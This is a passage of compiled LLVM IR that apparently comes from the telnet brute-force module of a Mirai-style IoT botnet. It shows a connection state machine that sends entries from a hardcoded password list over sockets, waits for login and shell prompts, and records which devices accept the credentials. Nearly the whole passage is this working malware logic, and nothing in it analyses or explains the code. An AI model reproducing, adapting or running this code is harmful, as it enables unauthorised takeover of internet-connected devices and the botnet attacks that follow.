  %1098 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1097, i32 0, i32 3
  store i8 0, i8* %1098, align 1
  br label %2271

1099:                                             ; preds = %1076
  %1100 = load i32, i32* %2, align 4
  %1101 = sext i32 %1100 to i64
  %1102 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1101
  %1103 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1102, i32 0, i32 8
  %1104 = load i8*, i8** %1103, align 8
  %1105 = call i64 @strlen(i8* %1104) #11
  %1106 = trunc i64 %1105 to i16
  %1107 = load i32, i32* %2, align 4
  %1108 = sext i32 %1107 to i64
  %1109 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1108
  %1110 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1109, i32 0, i32 7
  store i16 %1106, i16* %1110, align 16
  br label %1111

1111:                                             ; preds = %1099
  %1112 = load i32, i32* %2, align 4
  %1113 = sext i32 %1112 to i64
  %1114 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1113
  %1115 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1114, i32 0, i32 6
  %1116 = load i32, i32* %1115, align 4
  %1117 = add i32 %1116, 10
  %1118 = zext i32 %1117 to i64
  %1119 = call i64 @time(i64* null) #12
  %1120 = icmp slt i64 %1118, %1119
  br i1 %1120, label %1121, label %1136

1121:                                             ; preds = %1111
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1124, i32 0, i32 0
  %1126 = load i32, i32* %1125, align 16
  %1127 = call i32 @sclose(i32 %1126)
  %1128 = load i32, i32* %2, align 4
  %1129 = sext i32 %1128 to i64
  %1130 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1129
  %1131 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1130, i32 0, i32 2
  store i8 0, i8* %1131, align 8
  %1132 = load i32, i32* %2, align 4
  %1133 = sext i32 %1132 to i64
  %1134 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1133
  %1135 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1134, i32 0, i32 3
  store i8 1, i8* %1135, align 1
  br label %1136

1136:                                             ; preds = %1121, %1111
  br label %2270

1137:                                             ; preds = %69
  %1138 = load i32, i32* %2, align 4
  %1139 = sext i32 %1138 to i64
  %1140 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1139
  %1141 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1140, i32 0, i32 0
  %1142 = load i32, i32* %1141, align 16
  %1143 = load i32, i32* %2, align 4
  %1144 = sext i32 %1143 to i64
  %1145 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1144
  %1146 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1145, i32 0, i32 5
  %1147 = load i8, i8* %1146, align 1
  %1148 = zext i8 %1147 to i64
  %1149 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1148
  %1150 = load i8*, i8** %1149, align 8
  %1151 = load i32, i32* %2, align 4
  %1152 = sext i32 %1151 to i64
  %1153 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1152
  %1154 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1153, i32 0, i32 5
  %1155 = load i8, i8* %1154, align 1
  %1156 = zext i8 %1155 to i64
  %1157 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1156
  %1158 = load i8*, i8** %1157, align 8
  %1159 = call i64 @strlen(i8* %1158) #11
  %1160 = call i64 @send(i32 %1142, i8* %1150, i64 %1159, i32 16384)
  %1161 = icmp slt i64 %1160, 0
  br i1 %1161, label %1162, label %1177

1162:                                             ; preds = %1137
  %1163 = load i32, i32* %2, align 4
  %1164 = sext i32 %1163 to i64
  %1165 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1164
  %1166 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1165, i32 0, i32 0
  %1167 = load i32, i32* %1166, align 16
  %1168 = call i32 @sclose(i32 %1167)
  %1169 = load i32, i32* %2, align 4
  %1170 = sext i32 %1169 to i64
  %1171 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1170
  %1172 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1171, i32 0, i32 2
  store i8 0, i8* %1172, align 8
  %1173 = load i32, i32* %2, align 4
  %1174 = sext i32 %1173 to i64
  %1175 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1174
  %1176 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1175, i32 0, i32 3
  store i8 1, i8* %1176, align 1
  br label %2271

1177:                                             ; preds = %1137
  %1178 = load i32, i32* %2, align 4
  %1179 = sext i32 %1178 to i64
  %1180 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1179
  %1181 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1180, i32 0, i32 0
  %1182 = load i32, i32* %1181, align 16
  %1183 = call i64 @send(i32 %1182, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i64 0, i64 0), i64 2, i32 16384)
  %1184 = icmp slt i64 %1183, 0
  br i1 %1184, label %1185, label %1200

1185:                                             ; preds = %1177
  %1186 = load i32, i32* %2, align 4
  %1187 = sext i32 %1186 to i64
  %1188 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1187
  %1189 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1188, i32 0, i32 0
  %1190 = load i32, i32* %1189, align 16
  %1191 = call i32 @sclose(i32 %1190)
  %1192 = load i32, i32* %2, align 4
  %1193 = sext i32 %1192 to i64
  %1194 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1193
  %1195 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1194, i32 0, i32 2
  store i8 0, i8* %1195, align 8
  %1196 = load i32, i32* %2, align 4
  %1197 = sext i32 %1196 to i64
  %1198 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1197
  %1199 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1198, i32 0, i32 3
  store i8 1, i8* %1199, align 1
  br label %2271

1200:                                             ; preds = %1177
  %1201 = load i32, i32* %2, align 4
  %1202 = sext i32 %1201 to i64
  %1203 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1202
  %1204 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1203, i32 0, i32 2
  store i8 6, i8* %1204, align 8
  br label %2270

1205:                                             ; preds = %69
  %1206 = load i32, i32* %2, align 4
  %1207 = sext i32 %1206 to i64
  %1208 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1207
  %1209 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1208, i32 0, i32 6
  %1210 = load i32, i32* %1209, align 4
  %1211 = icmp eq i32 %1210, 0
  br i1 %1211, label %1212, label %1219

1212:                                             ; preds = %1205
  %1213 = call i64 @time(i64* null) #12
  %1214 = trunc i64 %1213 to i32
  %1215 = load i32, i32* %2, align 4
  %1216 = sext i32 %1215 to i64
  %1217 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1216
  %1218 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1217, i32 0, i32 6
  store i32 %1214, i32* %1218, align 4
  br label %1219

1219:                                             ; preds = %1212, %1205
  %1220 = load i32, i32* %2, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1222, i32 0, i32 0
  %1224 = load i32, i32* %1223, align 16
  %1225 = load i32, i32* %2, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1226
  %1228 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1227, i32 0, i32 8
  %1229 = load i8*, i8** %1228, align 8
  %1230 = load i32, i32* %2, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1231
  %1233 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1232, i32 0, i32 7
  %1234 = load i16, i16* %1233, align 16
  %1235 = zext i16 %1234 to i32
  %1236 = call i32 @readUntil(i32 %1224, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1229, i32 1024, i32 %1235)
  %1237 = icmp ne i32 %1236, 0
  br i1 %1237, label %1238, label %1313

1238:                                             ; preds = %1219
  %1239 = load i32, i32* %2, align 4
  %1240 = sext i32 %1239 to i64
  %1241 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1240
  %1242 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1241, i32 0, i32 6
  store i32 0, i32* %1242, align 4
  %1243 = load i32, i32* %2, align 4
  %1244 = sext i32 %1243 to i64
  %1245 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1244
  %1246 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1245, i32 0, i32 7
  store i16 0, i16* %1246, align 16
  %1247 = load i32, i32* %2, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1248
  %1250 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1249, i32 0, i32 8
  %1251 = load i8*, i8** %1250, align 8
  %1252 = call i8* @strstr(i8* %1251, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #11
  %1253 = icmp ne i8* %1252, null
  br i1 %1253, label %1254, label %1274

1254:                                             ; preds = %1238
  %1255 = load i32, i32* %2, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1257, i32 0, i32 8
  %1259 = load i8*, i8** %1258, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1259, i8 0, i64 1024, i1 false)
  %1260 = load i32, i32* %2, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1262, i32 0, i32 0
  %1264 = load i32, i32* %1263, align 16
  %1265 = call i32 @sclose(i32 %1264)
  %1266 = load i32, i32* %2, align 4
  %1267 = sext i32 %1266 to i64
  %1268 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1267
  %1269 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1268, i32 0, i32 2
  store i8 0, i8* %1269, align 8
  %1270 = load i32, i32* %2, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1272, i32 0, i32 3
  store i8 0, i8* %1273, align 1
  br label %2271

1274:                                             ; preds = %1238
  %1275 = load i32, i32* %2, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1277, i32 0, i32 8
  %1279 = load i8*, i8** %1278, align 8
  %1280 = call i32 @matchPrompt(i8* %1279)
  %1281 = icmp ne i32 %1280, 0
  br i1 %1281, label %1302, label %1282

1282:                                             ; preds = %1274
  %1283 = load i32, i32* %2, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1284
  %1286 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1285, i32 0, i32 8
  %1287 = load i8*, i8** %1286, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1287, i8 0, i64 1024, i1 false)
  %1288 = load i32, i32* %2, align 4
  %1289 = sext i32 %1288 to i64
  %1290 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1289
  %1291 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1290, i32 0, i32 0
  %1292 = load i32, i32* %1291, align 16
  %1293 = call i32 @sclose(i32 %1292)
  %1294 = load i32, i32* %2, align 4
  %1295 = sext i32 %1294 to i64
  %1296 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1296, i32 0, i32 2
  store i8 0, i8* %1297, align 8
  %1298 = load i32, i32* %2, align 4
  %1299 = sext i32 %1298 to i64
  %1300 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1299
  %1301 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1300, i32 0, i32 3
  store i8 1, i8* %1301, align 1
  br label %2271

1302:                                             ; preds = %1274
  %1303 = load i32, i32* %2, align 4
  %1304 = sext i32 %1303 to i64
  %1305 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1304
  %1306 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1305, i32 0, i32 2
  store i8 7, i8* %1306, align 8
  br label %1307

1307:                                             ; preds = %1302
  %1308 = load i32, i32* %2, align 4
  %1309 = sext i32 %1308 to i64
  %1310 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1309
  %1311 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1310, i32 0, i32 8
  %1312 = load i8*, i8** %1311, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1312, i8 0, i64 1024, i1 false)
  br label %2271

1313:                                             ; preds = %1219
  %1314 = load i32, i32* %2, align 4
  %1315 = sext i32 %1314 to i64
  %1316 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1315
  %1317 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1316, i32 0, i32 0
  %1318 = load i32, i32* %1317, align 16
  %1319 = load i32, i32* %2, align 4
  %1320 = sext i32 %1319 to i64
  %1321 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1320
  %1322 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1321, i32 0, i32 8
  %1323 = load i8*, i8** %1322, align 8
  %1324 = load i32, i32* %2, align 4
  %1325 = sext i32 %1324 to i64
  %1326 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1325
  %1327 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1326, i32 0, i32 7
  %1328 = load i16, i16* %1327, align 16
  %1329 = zext i16 %1328 to i32
  %1330 = call i32 @readUntil(i32 %1318, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1323, i32 1024, i32 %1329)
  %1331 = icmp ne i32 %1330, 0
  br i1 %1331, label %1332, label %1407

1332:                                             ; preds = %1313
  %1333 = load i32, i32* %2, align 4
  %1334 = sext i32 %1333 to i64
  %1335 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1334
  %1336 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1335, i32 0, i32 6
  store i32 0, i32* %1336, align 4
  %1337 = load i32, i32* %2, align 4
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1338
  %1340 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1339, i32 0, i32 7
  store i16 0, i16* %1340, align 16
  %1341 = load i32, i32* %2, align 4
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1342
  %1344 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1343, i32 0, i32 8
  %1345 = load i8*, i8** %1344, align 8
  %1346 = call i8* @strstr(i8* %1345, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #11
  %1347 = icmp ne i8* %1346, null
  br i1 %1347, label %1348, label %1368

1348:                                             ; preds = %1332
  %1349 = load i32, i32* %2, align 4
  %1350 = sext i32 %1349 to i64
  %1351 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1350
  %1352 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1351, i32 0, i32 8
  %1353 = load i8*, i8** %1352, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1353, i8 0, i64 1024, i1 false)
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %1356 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1356, i32 0, i32 0
  %1358 = load i32, i32* %1357, align 16
  %1359 = call i32 @sclose(i32 %1358)
  %1360 = load i32, i32* %2, align 4
  %1361 = sext i32 %1360 to i64
  %1362 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1361
  %1363 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1362, i32 0, i32 2
  store i8 0, i8* %1363, align 8
  %1364 = load i32, i32* %2, align 4
  %1365 = sext i32 %1364 to i64
  %1366 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1365
  %1367 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1366, i32 0, i32 3
  store i8 0, i8* %1367, align 1
  br label %2271

1368:                                             ; preds = %1332
  %1369 = load i32, i32* %2, align 4
  %1370 = sext i32 %1369 to i64
  %1371 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1370
  %1372 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1371, i32 0, i32 8
  %1373 = load i8*, i8** %1372, align 8
  %1374 = call i32 @matchPrompt(i8* %1373)
  %1375 = icmp ne i32 %1374, 0
  br i1 %1375, label %1396, label %1376

1376:                                             ; preds = %1368
  %1377 = load i32, i32* %2, align 4
  %1378 = sext i32 %1377 to i64
  %1379 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1378
  %1380 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1379, i32 0, i32 8
  %1381 = load i8*, i8** %1380, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1381, i8 0, i64 1024, i1 false)
  %1382 = load i32, i32* %2, align 4
  %1383 = sext i32 %1382 to i64
  %1384 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1383
  %1385 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1384, i32 0, i32 0
  %1386 = load i32, i32* %1385, align 16
  %1387 = call i32 @sclose(i32 %1386)
  %1388 = load i32, i32* %2, align 4
  %1389 = sext i32 %1388 to i64
  %1390 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1389
  %1391 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1390, i32 0, i32 2
  store i8 0, i8* %1391, align 8
  %1392 = load i32, i32* %2, align 4
  %1393 = sext i32 %1392 to i64
  %1394 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1393
  %1395 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1394, i32 0, i32 3
  store i8 1, i8* %1395, align 1
  br label %2271

1396:                                             ; preds = %1368
  %1397 = load i32, i32* %2, align 4
  %1398 = sext i32 %1397 to i64
  %1399 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1398
  %1400 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1399, i32 0, i32 2
  store i8 7, i8* %1400, align 8
  br label %1401

1401:                                             ; preds = %1396
  %1402 = load i32, i32* %2, align 4
  %1403 = sext i32 %1402 to i64
  %1404 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1403
  %1405 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1404, i32 0, i32 8
  %1406 = load i8*, i8** %1405, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1406, i8 0, i64 1024, i1 false)
  br label %2271

1407:                                             ; preds = %1313
  %1408 = load i32, i32* %2, align 4
  %1409 = sext i32 %1408 to i64
  %1410 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1409
  %1411 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1410, i32 0, i32 0
  %1412 = load i32, i32* %1411, align 16
  %1413 = load i32, i32* %2, align 4
  %1414 = sext i32 %1413 to i64
  %1415 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1414
  %1416 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1415, i32 0, i32 8
  %1417 = load i8*, i8** %1416, align 8
  %1418 = load i32, i32* %2, align 4
  %1419 = sext i32 %1418 to i64
  %1420 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1419
  %1421 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1420, i32 0, i32 7
  %1422 = load i16, i16* %1421, align 16
  %1423 = zext i16 %1422 to i32
  %1424 = call i32 @readUntil(i32 %1412, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1417, i32 1024, i32 %1423)
  %1425 = icmp ne i32 %1424, 0
  br i1 %1425, label %1426, label %1473

1426:                                             ; preds = %1407
  %1427 = load i32, i32* %2, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1429, i32 0, i32 6
  store i32 0, i32* %1430, align 4
  %1431 = load i32, i32* %2, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1433, i32 0, i32 7
  store i16 0, i16* %1434, align 16
  %1435 = load i32, i32* %2, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1436
  %1438 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1437, i32 0, i32 8
  %1439 = load i8*, i8** %1438, align 8
  %1440 = call i8* @strstr(i8* %1439, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #11
  %1441 = icmp ne i8* %1440, null
  br i1 %1441, label %1442, label %1462

1442:                                             ; preds = %1426
  %1443 = load i32, i32* %2, align 4
  %1444 = sext i32 %1443 to i64
  %1445 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1444
  %1446 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1445, i32 0, i32 8
  %1447 = load i8*, i8** %1446, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1447, i8 0, i64 1024, i1 false)
  %1448 = load i32, i32* %2, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1450, i32 0, i32 0
  %1452 = load i32, i32* %1451, align 16
  %1453 = call i32 @sclose(i32 %1452)
  %1454 = load i32, i32* %2, align 4
  %1455 = sext i32 %1454 to i64
  %1456 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1455
  %1457 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1456, i32 0, i32 2
  store i8 0, i8* %1457, align 8
  %1458 = load i32, i32* %2, align 4
  %1459 = sext i32 %1458 to i64
  %1460 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1459
  %1461 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1460, i32 0, i32 3
  store i8 0, i8* %1461, align 1
  br label %2271

1462:                                             ; preds = %1426
  %1463 = load i32, i32* %2, align 4
  %1464 = sext i32 %1463 to i64
  %1465 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1464
  %1466 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1465, i32 0, i32 2
  store i8 7, i8* %1466, align 8
  br label %1467

1467:                                             ; preds = %1462
  %1468 = load i32, i32* %2, align 4
  %1469 = sext i32 %1468 to i64
  %1470 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1469
  %1471 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1470, i32 0, i32 8
  %1472 = load i8*, i8** %1471, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1472, i8 0, i64 1024, i1 false)
  br label %2271

1473:                                             ; preds = %1407
  %1474 = load i32, i32* %2, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1475
  %1477 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1476, i32 0, i32 0
  %1478 = load i32, i32* %1477, align 16
  %1479 = load i32, i32* %2, align 4
  %1480 = sext i32 %1479 to i64
  %1481 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1480
  %1482 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1481, i32 0, i32 8
  %1483 = load i8*, i8** %1482, align 8
  %1484 = load i32, i32* %2, align 4
  %1485 = sext i32 %1484 to i64
  %1486 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1485
  %1487 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1486, i32 0, i32 7
  %1488 = load i16, i16* %1487, align 16
  %1489 = zext i16 %1488 to i32
  %1490 = call i32 @readUntil(i32 %1478, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1483, i32 1024, i32 %1489)
  %1491 = icmp ne i32 %1490, 0
  br i1 %1491, label %1492, label %1539

1492:                                             ; preds = %1473
  %1493 = load i32, i32* %2, align 4
  %1494 = sext i32 %1493 to i64
  %1495 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1494
  %1496 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1495, i32 0, i32 6
  store i32 0, i32* %1496, align 4
  %1497 = load i32, i32* %2, align 4
  %1498 = sext i32 %1497 to i64
  %1499 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1498
  %1500 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1499, i32 0, i32 7
  store i16 0, i16* %1500, align 16
  %1501 = load i32, i32* %2, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1502
  %1504 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1503, i32 0, i32 8
  %1505 = load i8*, i8** %1504, align 8
  %1506 = call i8* @strstr(i8* %1505, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #11
  %1507 = icmp ne i8* %1506, null
  br i1 %1507, label %1508, label %1528

1508:                                             ; preds = %1492
  %1509 = load i32, i32* %2, align 4
  %1510 = sext i32 %1509 to i64
  %1511 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1510
  %1512 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1511, i32 0, i32 8
  %1513 = load i8*, i8** %1512, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1513, i8 0, i64 1024, i1 false)
  %1514 = load i32, i32* %2, align 4
  %1515 = sext i32 %1514 to i64
  %1516 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1515
  %1517 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1516, i32 0, i32 0
  %1518 = load i32, i32* %1517, align 16
  %1519 = call i32 @sclose(i32 %1518)
  %1520 = load i32, i32* %2, align 4
  %1521 = sext i32 %1520 to i64
